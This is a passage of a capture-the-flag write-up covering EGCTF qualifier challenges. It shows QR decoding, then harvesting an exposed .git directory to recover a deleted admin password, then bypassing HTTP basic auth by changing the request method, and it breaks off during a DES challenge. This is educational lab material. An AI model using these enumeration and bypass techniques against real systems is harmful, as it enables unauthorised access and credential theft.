flag:<br><img src="/images/ctfs/egctf-qual/2.png" alt=""></p><p><img src="/images/ctfs/egctf-qual/3.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R_c0d3$_!$_n07_4n_34$y_74$k&#125; 3nd_0f_Fl49 .</span><br></pre></td></tr></table></figure><p>I tried rotating the image by 90 degrees to see if I’ll get any different results, which actually worked:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;misc&#x2F;QR-c0d3# convert QR.png -rotate 90 QR_2.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;misc&#x2F;QR-c0d3#</span><br></pre></td></tr></table></figure><p><code>QR_2.png</code>:<br><img src="/images/ctfs/egctf-qual/11QR_2.png" alt=""></p><p><img src="/images/ctfs/egctf-qual/4.png" alt=""></p><p><img src="/images/ctfs/egctf-qual/5.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7h!5 m355493. Th3 fl49 !5 EGCTF&#123;m3r9!n9_ Q</span><br></pre></td></tr></table></figure><p>Let’s get the other 2 images:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;misc&#x2F;QR-c0d3# convert QR_2.png -rotate 90 QR_3.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;misc&#x2F;QR-c0d3# convert QR_3.png -rotate 90 QR_4.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;misc&#x2F;QR-c0d3#</span><br></pre></td></tr></table></figure><p><code>QR_3.png</code>:<br><img src="/images/ctfs/egctf-qual/12QR_3.png" alt=""></p><p><img src="/images/ctfs/egctf-qual/6.png" alt=""></p><p><img src="/images/ctfs/egctf-qual/7.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H3ll0. Th!5 !5 4 m355493 fr0m 39yp7. Y0u n</span><br></pre></td></tr></table></figure><p><code>QR_4.png</code>:<br><img src="/images/ctfs/egctf-qual/13QR_4.png" alt=""></p><p><img src="/images/ctfs/egctf-qual/8.png" alt=""></p><p><img src="/images/ctfs/egctf-qual/9.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33d m0r3 7h4n 4 QR c0d3 5c4nn3r 70 d3c0d3</span><br></pre></td></tr></table></figure><p>Final message:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H3ll0. Th!5 !5 4 m355493 fr0m 39yp7. Y0u n33d m0r3 7h4n 4 QR c0d3 5c4nn3r 70 d3c0d3 7h!5 m355493. Th3 fl49 !5 EGCTF&#123;m3r9!n9_ QR_c0d3$_!$_n07_4n_34$y_74$k&#125; 3nd_0f_Fl49 .</span><br></pre></td></tr></table></figure><h2 id="Web-Hold-Up"><a href="#Web-Hold-Up" class="headerlink" title="Web: Hold Up"></a>Web: Hold Up</h2><h3 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I never set out to be weird. It was always other people who called me weird.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;172.105.76.128&#x2F;</span><br></pre></td></tr></table></figure><h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution:"></a>Solution:</h3><p>The index page only had an image saying “SITE UNDER CONSTRUCTION” and nothing else:<br><img src="/images/ctfs/egctf-qual/14.png" alt=""><br>I ran <code>gobuster</code> to check for sub directories and found a <code>git</code> directory:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up# gobuster -u http:&#x2F;&#x2F;172.105.76.128&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;172.105.76.128&#x2F;</span><br><span class="line">[+] Threads      : 10</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;11&#x2F;16 21:22:42 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.git&#x2F;HEAD (Status: 200)</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;11&#x2F;16 21:23:22 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up#</span><br></pre></td></tr></table></figure><p><code>/.git</code>:<br><img src="/images/ctfs/egctf-qual/15.png" alt=""><br>I used <code>wget</code> to download it:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up# mkdir git</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up# cd git&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git# wget -r http:&#x2F;&#x2F;172.105.76.128&#x2F;.git&#x2F;</span><br><span class="line">---</span><br><span class="line">FINISHED --2019-11-16 21:25:20--</span><br><span class="line">Total wall clock time: 1m 21s</span><br><span class="line">Downloaded: 465 files, 712K in 0.9s (774 KB&#x2F;s)</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git# ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 3 root root 4096 Nov 16 21:23 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Nov 16 21:25 ..</span><br><span class="line">drwxr-xr-x 4 root root 4096 Nov 16 21:24 172.105.76.128</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git# cd 172.105.76.128&#x2F;.git&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git# ls -la</span><br><span class="line">total 88</span><br><span class="line">drwxr-xr-x  8 root root 4096 Nov 16 21:24  .</span><br><span class="line">drwxr-xr-x  4 root root 4096 Nov 16 21:24  ..</span><br><span class="line">drwxr-xr-x  2 root root 4096 Nov 16 21:24  branches</span><br><span class="line">-rw-r--r--  1 root root    9 Nov 15 02:08  COMMIT_EDITMSG</span><br><span class="line">-rw-r--r--  1 root root   92 Nov 15 02:08  config</span><br><span class="line">-rw-r--r--  1 root root   73 Nov 15 02:08  description</span><br><span class="line">-rw-r--r--  1 root root   23 Nov 15 02:08  HEAD</span><br><span class="line">drwxr-xr-x  2 root root 4096 Nov 16 21:24  hooks</span><br><span class="line">-rw-r--r--  1 root root  356 Nov 15 02:08  index</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:23  index.html</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:23 &#39;index.html?C&#x3D;D;O&#x3D;A&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:24 &#39;index.html?C&#x3D;D;O&#x3D;D&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:23 &#39;index.html?C&#x3D;M;O&#x3D;A&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:24 &#39;index.html?C&#x3D;M;O&#x3D;D&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:24 &#39;index.html?C&#x3D;N;O&#x3D;A&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:23 &#39;index.html?C&#x3D;N;O&#x3D;D&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:23 &#39;index.html?C&#x3D;S;O&#x3D;A&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:24 &#39;index.html?C&#x3D;S;O&#x3D;D&#39;</span><br><span class="line">drwxr-xr-x  2 root root 4096 Nov 16 21:24  info</span><br><span class="line">drwxr-xr-x  3 root root 4096 Nov 16 21:24  logs</span><br><span class="line">drwxr-xr-x 36 root root 4096 Nov 16 21:24  objects</span><br><span class="line">drwxr-xr-x  4 root root 4096 Nov 16 21:25  refs</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git#</span><br></pre></td></tr></table></figure><p>I checked the <code>reflog</code> to see the commits:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git# git reflog </span><br><span class="line">2e3e1a8 (HEAD -&gt; master) HEAD@&#123;0&#125;: commit: Refining</span><br><span class="line">89329fa HEAD@&#123;1&#125;: commit: NewFeature</span><br><span class="line">dfecece HEAD@&#123;2&#125;: commit: Addinfo</span><br><span class="line">b032cf8 HEAD@&#123;3&#125;: commit: Disable</span><br><span class="line">5b9e491 HEAD@&#123;4&#125;: commit: DelCr</span><br><span class="line">457168f HEAD@&#123;5&#125;: commit: AddUsetting</span><br><span class="line">b55d897 HEAD@&#123;6&#125;: commit: editconf</span><br><span class="line">70ae358 HEAD@&#123;7&#125;: commit (initial): initials</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git#</span><br></pre></td></tr></table></figure><p>The commit <code>NewFeature (89329fa)</code> revealed a secret path (<code>/S3cR3tPaTh</code>):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git# git show 2e3e1a8</span><br><span class="line">commit 2e3e1a8c124768ecbb31e92d5c070003924b9254 (HEAD -&gt; master)</span><br><span class="line">Author: Ben ALaa &lt;a.alaa@egcert.eg&gt;</span><br><span class="line">Date:   Thu Nov 14 23:18:26 2019 +0100</span><br><span class="line"></span><br><span class="line">    Refining</span><br><span class="line"></span><br><span class="line">diff --git a&#x2F;S3cR3tPaTh&#x2F;config.php b&#x2F;S3cR3tPaTh&#x2F;config.php</span><br><span class="line">index 3d7f801..706d93b 100644</span><br><span class="line">--- a&#x2F;S3cR3tPaTh&#x2F;config.php</span><br><span class="line">+++ b&#x2F;S3cR3tPaTh&#x2F;config.php</span><br><span class="line">@@ -419,15 +419,6 @@ $CONFIG &#x3D; array(</span><br><span class="line">  *&#x2F;</span><br><span class="line"> &#39;overwriteprotocol&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line"> </span><br><span class="line">-&#x2F;**</span><br><span class="line">- * Override webroot</span><br><span class="line">- * ownCloud attempts to detect the webroot for generating URLs automatically.</span><br><span class="line">- * For example, if &#96;www.example.com&#x2F;owncloud&#96; is the URL pointing to the</span><br><span class="line">- * ownCloud instance, the webroot is &#96;&#x2F;owncloud&#96;. When proxies are in use, it</span><br><span class="line">- * may be difficult for ownCloud to detect this parameter, resulting in invalid URLs.</span><br><span class="line">- *&#x2F;</span><br><span class="line">-&#39;overwritewebroot&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">-</span><br><span class="line"> &#x2F;**</span><br><span class="line">  * Override condition</span><br><span class="line">  * This option allows you to define a manual override condition as a regular</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git#</span><br></pre></td></tr></table></figure><p><code>/S3cR3tPaTh</code>:<br><img src="/images/ctfs/egctf-qual/16.png" alt=""><br>I could also find the credentials in one of the commits (<code>DelCr (5b9e491)</code>):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git# git show 5b9e491</span><br><span class="line">commit 5b9e491802d53d6af1ef25206ccb0765b64a248b</span><br><span class="line">Author: Ben ALaa &lt;a.alaa@egcert.eg&gt;</span><br><span class="line">Date:   Thu Nov 14 23:15:11 2019 +0100</span><br><span class="line"></span><br><span class="line">    DelCr</span><br><span class="line"></span><br><span class="line">diff --git a&#x2F;S3cR3tPaTh&#x2F;config.php b&#x2F;S3cR3tPaTh&#x2F;config.php</span><br><span class="line">index 46ed4f3..72e9842 100644</span><br><span class="line">--- a&#x2F;S3cR3tPaTh&#x2F;config.php</span><br><span class="line">+++ b&#x2F;S3cR3tPaTh&#x2F;config.php</span><br><span class="line">@@ -194,7 +194,7 @@ $CONFIG &#x3D; array(</span><br><span class="line"> &#39;knowledgebaseenabled&#39; &#x3D;&gt; true,</span><br><span class="line"></span><br><span class="line"> &#x2F;**</span><br><span class="line">- * Enables or disables avatars or user profile photos</span><br><span class="line">+ &#x2F;* Enables or disables avatars or user profile photos</span><br><span class="line">  * &#96;true&#96; enables avatars, or user profile photos, &#96;false&#96; disables them.</span><br><span class="line">  * These appear on the User page, on user&#39;s Personal pages and are used by some apps</span><br><span class="line">  * (contacts, mail, etc).</span><br><span class="line">@@ -469,15 +469,7 @@ $CONFIG &#x3D; array(</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-</span><br><span class="line">-&#x2F;**</span><br><span class="line">-* Admin Credentials</span><br><span class="line">-**&#x2F;</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-&#39;Admin_Login&#39; &#x3D;&gt; &#39;Administrator&#39;</span><br><span class="line">-&#39;Admin_Password&#39; &#x3D;&gt; &#39;FN3ym@bZNaF&amp;&#39;</span><br><span class="line">-</span><br><span class="line">+&#x2F;** Delete Admin creds. **&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &#x2F;**</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git#</span><br></pre></td></tr></table></figure><p><img src="/images/ctfs/egctf-qual/17.png" alt=""></p><p><img src="/images/ctfs/egctf-qual/18.png" alt=""></p><h2 id="Web-Tamp3rat0r"><a href="#Web-Tamp3rat0r" class="headerlink" title="Web: Tamp3rat0r"></a>Web: Tamp3rat0r</h2><h3 id="Challenge-Description-5"><a href="#Challenge-Description-5" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Some one hacked us, we are sure that our password is so strong!</span><br><span class="line">We&#39;ve no idea what&#39;s happening!</span><br><span class="line">Can you check if our security is solid or not!</span><br><span class="line">http:&#x2F;&#x2F;167.71.248.246&#x2F;secure&#x2F;</span><br></pre></td></tr></table></figure><h3 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution:"></a>Solution:</h3><p>This was the easiest web challenge, by visiting the site we get asked for authentication:<br><img src="/images/ctfs/egctf-qual/19.png" alt=""><br>As the description said, the password is strong so bruteforcing the basic auth is not the solution, the challenge name is <code>Tamp3rat0r</code> so I tried tampering with the request method:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;Tamp3rat0r# curl http:&#x2F;&#x2F;167.71.248.246&#x2F;secure&#x2F;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;401 Unauthorized&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Unauthorized&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;This server could not verify that you</span><br><span class="line">are authorized to access the document</span><br><span class="line">requested.  Either you supplied the wrong</span><br><span class="line">credentials (e.g., bad password), or your</span><br><span class="line">browser doesn&#39;t understand how to supply</span><br><span class="line">the credentials required.&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;address&gt;Apache&#x2F;2.4.29 (Ubuntu) Server at 167.71.248.246 Port 80&lt;&#x2F;address&gt;</span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;Tamp3rat0r# curl -X POST http:&#x2F;&#x2F;167.71.248.246&#x2F;secure&#x2F;</span><br><span class="line">our secret flag is: EGCTF&#123;0xc7d22f_is_a_t4mp3rat0r&#125;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;Tamp3rat0r#</span><br></pre></td></tr></table></figure><h2 id="Crypto-Des-amies"><a href="#Crypto-Des-amies" class="headerlink" title="Crypto: Des amies"></a>Crypto: Des amies</h2><h3 id="Challenge-Description-6"><a href="#Challenge-Description-6" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 167.71.93.117 9000</span><br></pre></td></tr></table></figure><h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint:"></a>Hint:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Strong key!</span><br></pre></td></tr></table></figure><h3 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution:"></a>Solution:</h3><p>By connecting to that port we get asked for a name, then we get an encrypted output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# nc 167.71.93.117 9000</span><br><span class="line">Name: test</span><br><span class="line">Here is your personalized message: Mi!</span><br><span class="line">                                      Itqq2@QRI,ƮG@0M\a&quot;?K4$y   N</span><br><span class="line">t-4QV</span><br><span class="line">     ]Khe-װWa58ky</span><br><span class="line"></span><br><span class="line">Bye</span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies#</span><br></pre></td></tr></table></figure><p>From the challenge name I assumed that the message is <code>DES</code> encrypted so I tried getting an encrypted message then sending it back again to see if I’ll get the decrypted result.<br>I sent <code>1</code>, then I saved the output to a file and called it <code>out.1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# echo 1 | nc 167.71.93.117 9000 </span><br><span class="line">Name: Here is your personalized message: L8O@eMcǊN4X0FƤ߃&amp;</span><br><span class="line">                                                         [Mڸ&quot;*A!v.$.8v\G9(sK&#123;~L&#123;+</span><br><span class="line">qOw|,&gt;ԄB̃]R</span><br><span class="line"></span><br><span class="line">Bye</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# echo 1 | nc 167.71.93.117 9000 &gt; out.1</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# xxd out.1 </span><br><span class="line">00000000: 4e61 6d65 3a20 4865 7265 2069 7320 796f  Name: Here is yo</span><br><span class="line">00000010: 7572 2070 6572 736f 6e61 6c69 7a65 6420  ur personalized </span><br><span class="line">00000020: 6d65 7373 6167 653a 20b4 4c38 4f0f 4019  message: .L8O.@.</span><br><span class="line">00000030: e065 834d 63a3 f987 c78a 0195 ebf9 4e34  .e.Mc.........N4</span><br><span class="line">00000040: 5813 30c0 46c6 a480 df83 260c 5b4d dab8  